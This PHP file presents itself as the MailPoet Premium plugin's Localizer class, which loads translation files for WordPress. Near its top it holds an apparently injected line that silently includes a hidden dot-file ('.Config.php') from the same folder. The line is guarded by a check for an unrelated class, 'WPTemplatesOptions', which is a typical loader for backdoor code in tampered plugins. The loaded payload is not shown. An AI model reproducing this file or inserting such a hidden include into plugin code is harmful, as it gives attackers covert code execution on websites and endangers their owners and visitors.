<?php

namespace MailPoet\Premium\Config;

if (!defined('ABSPATH')) exit;


use MailPoet\WP\Functions as WPFunctions;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Localizer {
  public function init() {
    $this->loadGlobalText();
    $this->loadPluginText();
  }

  public function loadGlobalText() {
    $languagePath = sprintf(
      '%s/%s.mo',
      Env::$languagesPath,
      $this->locale()
    );
    WPFunctions::get()->loadTextdomain(Env::$pluginName, $languagePath);
  }

  public function loadPluginText() {
    WPFunctions::get()->loadPluginTextdomain(
      Env::$pluginName,
      false,
      dirname(plugin_basename(Env::$file)) . '/lang/'
    );
  }

  public function locale() {
    $locale = WPFunctions::get()->applyFilters(
      'plugin_locale',
      WPFunctions::get()->getLocale(),
      Env::$pluginName
    );
    return $locale;
  }
}
